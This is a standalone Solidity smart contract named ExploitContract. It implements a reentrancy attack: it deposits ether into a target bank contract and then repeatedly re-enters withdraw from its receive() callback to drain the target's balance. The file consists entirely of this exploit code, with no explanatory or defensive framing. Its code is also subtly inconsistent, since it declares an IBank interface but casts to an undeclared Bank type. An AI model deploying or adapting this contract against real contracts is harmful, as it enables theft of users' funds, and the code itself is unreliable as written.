contract ExploitContract {
    Bank public vulnerableBank;
    address public owner;

    constructor(address _bankAddress) {
        vulnerableBank = Bank(_bankAddress);
        owner = msg.sender;
    }

    receive() external payable {
        if (address(vulnerableBank).balance >= msg.value) {
            vulnerableBank.withdraw(msg.value);
        }
    }

    function attack() public payable {
        require(msg.value > 0);
        vulnerableBank.deposit{value: msg.value}();
        vulnerableBank.withdraw(msg.value);
    }
}

interface IBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}